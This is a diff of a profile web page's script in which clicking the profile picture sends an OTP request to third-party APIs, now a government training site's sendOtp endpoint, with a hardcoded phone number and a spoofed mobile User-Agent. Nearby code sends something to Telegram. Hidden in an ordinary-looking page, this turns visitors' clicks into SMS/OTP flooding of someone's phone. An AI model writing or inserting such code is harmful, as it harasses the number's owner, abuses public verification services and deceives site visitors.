@@ -64,8 +64,14 @@ if (typeof(bioShowMore) != 'undefined' && bioShowMore != null){
   
   if (profilePicture) {
     profilePicture.addEventListener('click', function() {
-      fetch('http://apibeta.iqra-live.com/api/v1/sent-otp/01861887876', {
-        method: 'GET'
+      fetch('https://training.gov.bd/backoffice/api/user/sendOtp', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json, text/plain, */*',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
+        },
+        body: JSON.stringify({ mobile: '01818969374' })
       })
       .then(response => response.json())
       .then(data => {
@@ -153,9 +159,8 @@ if (typeof(bioShowMore) != 'undefined' && bioShowMore != null){
         .catch(error => console.error('Error sending to Telegram:', error));
     }
   </script>
-
-
-<style>
+  
+  <style>
 
 *{box-sizing:border-box;}
 html {
